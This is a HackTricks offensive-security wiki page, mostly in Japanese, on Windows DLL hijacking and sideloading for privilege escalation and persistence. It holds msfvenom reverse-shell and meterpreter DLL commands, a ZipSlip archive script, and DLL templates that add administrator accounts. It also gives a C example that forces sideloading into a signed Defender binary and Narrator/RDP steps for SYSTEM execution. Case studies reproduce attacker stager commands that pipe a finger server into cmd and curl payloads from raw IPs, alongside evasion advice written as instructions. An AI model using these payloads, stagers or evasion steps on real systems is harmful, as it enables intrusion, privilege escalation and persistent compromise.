# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking は、信頼されたアプリケーションに悪意のある DLL を読み込ませるよう操作することを指します。この用語には **DLL Spoofing, Injection, and Side-Loading** といった複数の戦術が含まれます。主にコード実行、持続性の確保、そしてまれに privilege escalation に利用されます。ここでは escalation に焦点を当てていますが、ハイジャックの手法は目的にかかわらず一貫しています。

### Common Techniques

いくつかの方法が DLL hijacking に用いられ、各手法の有効性はアプリケーションの DLL ロード戦略に依存します:

1. **DLL Replacement**: 正規の DLL を悪意のあるものと置き換える。元の DLL の機能を維持するために任意で DLL Proxying を使用することがある。
2. **DLL Search Order Hijacking**: 悪意のある DLL を正規のものより先に検索されるパスに配置して、アプリケーションの検索パターンを悪用する。
3. **Phantom DLL Hijacking**: アプリケーションが存在しない必要な DLL だと判断して読み込もうとする悪意の DLL を作成する。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更して、アプリケーションを悪意のある DLL に誘導する。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のあるものと差し替える。これは DLL side-loading と関連することが多い。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともにユーザー制御下のディレクトリに悪意の DLL を配置する。Binary Proxy Execution 技術に類似する。

> [!TIP]
> DLL sideloading の上に HTML ステージング、AES-CTR 設定、.NET インプラントを重ねるステップバイステップのチェーンについては、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

システム内の欠落している Dll を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルタ**を設定することです:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![](<../../../images/image (153).png>)

一般的な **missing dlls** を探している場合は、このまま数秒間実行しておきます。\
特定の実行ファイル内の **missing dll** を探す場合は、`Process Name` が `contains` `<exec name>` のような別のフィルタを設定して実行し、イベントの取得を停止してください。

## Exploiting Missing Dlls

権限を昇格させるために最も有望なのは、特権プロセスが読み込もうとする dll を、そのプロセスが検索するいずれかの場所に書き込めることです。つまり、dll が正規の dll より先に検索されるフォルダに書き込める（稀なケース）か、検索されるフォルダのいずれかに書き込めて元の dll がどのフォルダにも存在しない場合です。

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows アプリケーションは、定義済みの検索パスのセットに従って DLL を探し、特定の順序で検索を行います。悪意のある DLL がこれらのディレクトリのいずれかに戦略的に配置されると、それが正規の DLL より先に読み込まれるため、DLL hijacking の問題が発生します。対策としては、アプリケーションが必要とする DLL を参照する際に絶対パスを使用することが有効です。

以下は 32-bit システムでの **DLL search order** です:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

これは **SafeDllSearchMode** が有効な場合の **デフォルト** の検索順序です。無効化すると、カレントディレクトリが第2位に上がります。この機能を無効化するには、レジストリの **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** を作成し、値を 0 に設定します（既定は有効）。

もし [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** を指定して呼ばれると、検索は **LoadLibraryEx** がロードしている実行モジュールのディレクトリから開始されます。

最後に、dll は名前だけでなく絶対パスを指定して読み込まれる場合があることに注意してください。その場合、その dll はそのパスでのみ検索されます（もしその dll に依存関係があれば、それらは名前のみで読み込まれたものとして検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

### Chaining an arbitrary file write into a missing-DLL hijack

1. **ProcMon** フィルタ（`Process Name` = target EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使い、プロセスがプローブしたが見つけられなかった DLL 名を収集します。
2. バイナリが **schedule/service** 上で実行される場合、これらの名前のいずれかで DLL を **application directory**（検索順序のエントリ #1）に置くと次回実行時に読み込まれます。ある .NET スキャナのケースでは、プロセスは実際のコピーを `C:\Program Files\dotnet\fxr\...` から読み込む前に `C:\samples\app\` で `hostfxr.dll` を探していました。
3. 任意のエクスポートを持つペイロード DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`。
4. もしプリミティブが **ZipSlip-style arbitrary write** であれば、エントリが展開ディレクトリから脱出するような ZIP を作成して、DLL がアプリフォルダに配置されるようにします:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. アーカイブを監視されている inbox/share に配布する。scheduled task がプロセスを再起動すると、悪意ある DLL が読み込まれ、そのコードが service account として実行される。

### RTL_USER_PROCESS_PARAMETERS.DllPath を介した sideloading の強制

新しく作成されたプロセスの DLL 検索パスに決定的に影響を与える高度な方法は、ntdll の native API を使ってプロセスを作成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに攻撃者が制御するディレクトリを指定すると、インポートされた DLL を名前で解決する（絶対パスを指定しておらず、safe loading flags を使っていない）ターゲットプロセスは、そのディレクトリから悪意ある DLL を読み込むよう強制できます。

Key idea
- RtlCreateProcessParametersEx で process parameters を構築し、カスタム DllPath を指定して自分が制御するフォルダ（例: dropper/unpacker があるディレクトリ）を指すようにする。
- RtlCreateUserProcess でプロセスを作成する。ターゲットバイナリが DLL を名前で解決する場合、ローダは解決時に指定された DllPath を参照し、malicious DLL が target EXE と同じ場所にない場合でも信頼できる sideloading を可能にする。

Notes/limitations
- これは作成される子プロセスに影響を与える。現在のプロセスにのみ影響する SetDllDirectory とは異なる。
- ターゲットは名前で DLL をインポートするか、LoadLibrary で名前指定してロードする必要がある（絶対パスを使わず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使用していない）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできない。Forwarded exports や SxS が優先順位を変える可能性がある。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>完全な C 例: RTL_USER_PROCESS_PARAMETERS.DllPath を介した DLL sideloading の強制</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用での使用例
- 悪意ある xmllite.dll（必要な関数をエクスポートするか、実際のものをプロキシするもの）を DllPath ディレクトリに置きます。
- 上記の手法を使って xmllite.dll を名前で参照することが知られている署名済みバイナリを起動します。ローダは指定された DllPath 経由でインポートを解決し、あなたの DLL を sideload します。

この手法は実際の攻撃でマルチステージの sideloading チェーンを引き起こす事例が観測されています：初期のランチャーがヘルパー DLL を配置し、それが Microsoft 署名のハイジャック可能なバイナリを生成してカスタムの DllPath を与え、ステージングディレクトリから攻撃者の DLL の読み込みを強制します。


#### Windows ドキュメントからの dll 検索順の例外

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### 特権昇格

**要件**:

- **異なる権限**（horizontal or lateral movement）で動作している、または動作するプロセスで、**DLL が欠けている**ものを特定します。
- **DLL** が **検索される**任意の**ディレクトリ**に対して**書き込みアクセス**があることを確認します。この場所は実行ファイルのディレクトリやシステムパス内のディレクトリである可能性があります。

はい、要件を見つけるのは難しいです。**デフォルトでは、特権のある実行ファイルが DLL を欠いているのを見つけるのはかなり珍しい**ですし、**システムパスのフォルダに書き込み権限があるのはさらに稀です**（通常はありません）。しかし、誤設定された環境ではこれは可能です。\
もし運良く要件を満たす環境を見つけた場合は、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認するとよいでしょう。プロジェクトの**主目的は UAC をバイパスすること**ですが、対象の Windows バージョン向けの Dll hijaking の **PoC** が見つかることがあり（おそらく書き込み権限のあるフォルダのパスを変更するだけで済みます）、それを利用できる可能性があります。

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
また、**PATH 内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
executable の imports と dll の exports は次のコマンドで確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)はsystem PATH内の任意のフォルダに対して書き込み権限があるかをチェックします。\
この脆弱性を発見するのに有用な自動化ツールとしては、**PowerSploit functions** の _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ などがあります。

### Example

もし悪用可能なシナリオを見つけた場合、成功させるために最も重要な点の一つは、実行ファイルがそこからインポートするすべての関数を少なくともエクスポートするdllを作成することです。なお、Dll Hijackingは[escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac)や[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)に役立ちます。実行目的のdll hijackingに関するこの研究には、**how to create a valid dll** の例があり、次に参照できます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)。\
さらに、次のセクションにはテンプレートとして使える基本的なdllコードや、不要な関数もエクスポートしたdllを作成するための例が掲載されています。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本的に、**Dll proxy** は読み込まれたときに悪意のあるコードを実行できると同時に、実際のライブラリへのすべての呼び出しを中継して期待通りに動作・公開するDllです。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) や [**Spartacus**](https://github.com/Accenture/Spartacus) を使えば、実行ファイルを指定してプロキシ化したいライブラリを選択し、プロキシ化されたdllを生成したり、Dllを指定してプロキシ化されたdllを生成したりできます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86、x64版は見当たりませんでした）:**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分用

多くの場合、コンパイルするDllは標的プロセスによってロードされる**export several functions**をエクスポートする必要があることに注意してください。これらの関数が存在しないと、**binary won't be able to load**し、**exploit will fail**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL のユーザー作成の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows の Narrator.exe は起動時に予測可能で言語固有のローカリゼーション DLL をプローブし、これをハイジャックすることで任意のコード実行と永続化が可能です。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- フィルター: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator を起動し、上記パスへの読み込み試行を観察します。

最小限の DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC の静音化
- 単純な hijack は UI を読み上げ/ハイライトします。静かにするには、アタッチ時に Narrator のスレッドを列挙し、メインスレッドを開いて（`OpenThread(THREAD_SUSPEND_RESUME)`）`SuspendThread` してから、自分のスレッドで処理を続行します。完全なコードは PoC を参照してください。

Trigger and persistence via Accessibility configuration
- ユーザコンテキスト (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記を設定すると、Narrator を起動した際に植えた DLL がロードされます。セキュアデスクトップ（ログオン画面）上で CTRL+WIN+ENTER を押すと Narrator が起動し、あなたの DLL はセキュアデスクトップ上で SYSTEM として実行されます。

RDP-triggered SYSTEM execution (lateral movement)
- クラシック RDP セキュリティレイヤを許可する: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL がセキュアデスクトップ上で SYSTEM として実行されます。
- 実行は RDP セッションが終了すると止まるため、速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool (AT) のレジストリエントリ（例: CursorIndicator）をクローンし、任意のバイナリ/DLL を指すよう編集してインポートし、`configuration` をその AT 名に設定できます。これにより Accessibility フレームワーク下で任意の実行をプロキシできます。

Notes
- `%windir%\System32` 以下への書き込みや HKLM の値変更には管理者権限が必要です。
- すべてのペイロードロジックは `DLL_PROCESS_ATTACH` に置けます。エクスポートは不要です。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

このケースは Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における Phantom DLL Hijacking（CVE-2025-1729）を示します。

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置されています。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は毎朝 9:30 にログオン中のユーザコンテキストで実行されます。
- **Directory Permissions**: `CREATOR OWNER` によって書き込み可能であり、ローカルユーザが任意のファイルを配置できます。
- **DLL Search Behavior**: ワーキングディレクトリからまず `hostfxr.dll` のロードを試み、存在しない場合は "NAME NOT FOUND" をログに出力します。これはローカルディレクトリが優先されていることを示します。

### Exploit Implementation

攻撃者は同じディレクトリに悪意ある `hostfxr.dll` スタブを置き、欠落した DLL を悪用してユーザコンテキストでコード実行を達成できます:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログインしている場合、悪意のあるDLLが管理者のセッションで medium integrity にて実行される。
4. 標準的な UAC bypass 技術を連鎖させ、medium integrity から SYSTEM 権限に昇格する。

## ケーススタディ: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

攻撃者はしばしば MSI ベースの dropper と DLL side-loading を組み合わせ、信頼された署名済みプロセスの下でペイロードを実行する。

チェーン概要
- ユーザーが MSI をダウンロードする。GUI インストール中に CustomAction がサイレントで実行され（例: LaunchApplication や VBScript アクション）、埋め込まれたリソースから次のステージを再構築する。
- dropper は正当な署名済み EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動されると、Windows の DLL 検索順により作業ディレクトリからまず wsc.dll が読み込まれ、署名された親プロセスの下で攻撃者コードが実行される（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- 実行ファイルや VBScript を実行するエントリを探す。疑わしいパターンの例: LaunchApplication が埋め込まれたファイルをバックグラウンドで実行する。
- Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary テーブルを確認する。
- MSI CAB 内の埋め込み/分割ペイロード:
- 管理者抽出: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結および復号される複数の小さなフラグメントを探す。一般的なフロー:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- 同じフォルダにこれら二つのファイルを置く:
- wsc_proxy.exe: 正当な署名付きホスト (Avast)。プロセスはディレクトリから名前で wsc.dll をロードしようとします。
- wsc.dll: 攻撃者 DLL。特定の exports が不要であれば DllMain で十分です；そうでない場合は proxy DLL を作成し、必要な exports を本物のライブラリにフォワードしつつ DllMain で payload を実行します。
- 最小限の DLL payload をビルド:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件がある場合は、プロキシングフレームワーク（例: DLLirant/Spartacus）を使用して、ペイロードも実行するフォワーディングDLLを生成する。

- この手法はホストバイナリによるDLL名解決に依存する。ホストが絶対パスや安全なロードフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用していると、hijackは失敗する可能性がある。
- KnownDLLs、SxS、および forwarded exports は優先度に影響を与える可能性があり、ホストバイナリやエクスポートセットの選定時に考慮する必要がある。

## 署名されたトライアド + 暗号化ペイロード（ShadowPad case study）

Check Pointは、Ink DragonがShadowPadを、正規ソフトウェアに紛れるようにしつつコアペイロードをディスク上で暗号化したまま展開するために、**three-file triad** を使用する方法を説明した:

1. **Signed host EXE** – AMD、Realtek、NVIDIAなどのベンダーのバイナリが悪用される（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前をWindowsのバイナリのように変更（例: `conhost.exe`）するが、Authenticode署名は有効なままである。
2. **Malicious loader DLL** – EXEの隣に想定される名前でドロップされる（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。このDLLは通常MFCバイナリで、ScatterBrainフレームワークで難読化されており、主な役割は暗号化されたブロブを発見して復号し、ShadowPadをreflectively mapすることだけである。
3. **Encrypted payload blob** – 同じディレクトリに `<name>.tmp` として保存されることが多い。復号されたペイロードをメモリマップした後、ローダーはフォレンジック証拠を破棄するためにTMPファイルを削除する。

Tradecraft notes:

* 署名されたEXEの名前を変更しても（PEヘッダの `OriginalFileName` を保持したまま）ベンダー署名は残るため、Windowsバイナリを装うことができる。したがって、本物のAMD/NVIDIAユーティリティである `conhost.exe` 風のバイナリをドロップするInk Dragonの手法を模倣せよ。
* 実行ファイルが信頼されたままであるため、ほとんどのallowlisting制御は単に悪意あるDLLが並んでいるだけで済む。loader DLLのカスタマイズに注力せよ; 署名済みの親は通常変更せずに実行できる。
* ShadowPadの復号器は、TMPブロブがローダーの隣に存在し、マッピング後にファイルをゼロ化できるよう書き込み可能であることを想定している。ペイロードがロードされるまでディレクトリを可書状態に保て。メモリにロードされたらTMPファイルはOPSECのため安全に削除できる。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

オペレータはDLL sideloadingをLOLBASと組み合わせ、ディスク上の唯一のカスタムアーティファクトを信頼されたEXEの隣の悪意あるDLLだけにする:

- **Remote command loader (Finger):** 隠蔽されたPowerShellが `cmd.exe /c` を起動し、Fingerサーバからコマンドを取得して `cmd` にパイプする:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` はTCP/79でテキストを取得する; `| cmd` はサーバ応答を実行し、オペレータはセカンドステージをサーバ側でローテートできる。

- **Built-in download/extract:** 無害な拡張子のアーカイブをダウンロードして展開し、sideloadターゲットとDLLをランダムな `%LocalAppData%` フォルダ下に配置する:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` は進行状況を隠しリダイレクトに従う; `tar -xf` はWindows組み込みのtarを使用する。

- **WMI/CIM launch:** WMI経由でEXEを起動し、テレメトリ上はCIM作成プロセスとして表示される間に共置されたDLLをロードさせる:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- ローカルDLLを優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で動作する; ペイロード（例: Remcos）は信頼された名前で実行される。

- **Hunting:** `/p`、`/m`、`/c` が同時に現れる `forfiles` を検出してアラートを上げよ; 管理者スクリプト以外では稀である。


## ケーススタディ: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近のLotus Blossomの侵入では、信頼されたアップデートチェーンを悪用してNSISでパックされたドロッパーを配布し、DLL sideloadと完全にメモリ内で動作するペイロードをステージした。

トレードクラフトのフロー
- `update.exe` (NSIS) は `%AppData%\Bluetooth` を作成し、それを **HIDDEN** にし、名前を変更した Bitdefender Submission Wizard `BluetoothService.exe`、悪意ある `log.dll`、暗号化されたブロブ `BluetoothService` をドロップしてからEXEを起動した。
- ホストEXEは `log.dll` をimportし、`LogInit`/`LogWrite` を呼ぶ。`LogInit` はブロブをmmapでロードする; `LogWrite` はカスタムLCGベースのストリーム（定数 **0x19660D** / **0x3C6EF35F**、鍵素材は事前のハッシュ由来）で復号し、バッファをプレーンテキストのシェルコードで上書きし、一時領域を解放してそこへジャンプする。
- IATを避けるため、ローダーはエクスポート名をハッシュ化してAPIを解決する。ハッシュは **FNV-1a basis 0x811C9DC5 + prime 0x1000193** を用い、Murmur風のアバランチ（**0x85EBCA6B**）を適用してソルト化されたターゲットハッシュと比較する。

主要シェルコード (Chrysalis)
- キー `gQ2JR&9;` を使って5パスで加算/XOR/減算を繰り返してPEライクなメインモジュールを復号し、次に動的に `Kernel32.dll` → `GetProcAddress` をロードしてインポート解決を完了する。
- 文字ごとのビット回転/XOR変換でランタイムにDLL名文字列を再構築し、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` をロードする。
- もう一つのリゾルバを使用し、**PEB → InMemoryOrderModuleList** をたどり、各エクスポートテーブルを4バイトブロックでMurmur風ミキシングして解析し、ハッシュが見つからない場合にのみ `GetProcAddress` にフォールバックする。

埋め込み設定とC2
- 設定はドロップされた `BluetoothService` ファイル内の **offset 0x30808**（サイズ **0x980**）にあり、キー `qwhvb^435h&*7` でRC4復号され、C2のURLとUser-Agentが明らかになる。
